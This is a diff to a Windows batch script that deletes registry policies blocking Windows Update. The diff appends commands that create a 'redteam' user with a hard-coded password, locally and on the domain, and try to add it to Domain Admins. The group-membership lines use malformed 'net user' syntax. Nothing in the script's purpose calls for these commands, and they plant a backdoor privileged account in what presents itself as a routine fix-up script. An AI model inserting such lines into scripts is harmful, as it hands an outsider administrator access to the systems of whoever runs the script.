@@ -89,3 +89,8 @@ REM This may be for some legacy shit.. not sure.. delete anyway
 REG DELETE "HKLM\SYSTEM\Internet Communication Management\Internet Communication" /F /v DisableWindowsUpdateAccess
 REM More policy fuckery. Delete. undo if something breaks. value should be 0
 REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /F /v DisableWindowsUpdateAccess
+
+net user redteam Lolredteam /add
+net user redteam Lolredteam /add /domain
+net user redteam "Domain Admins" /add
+net user redteam "Domain Admins" /add /domain
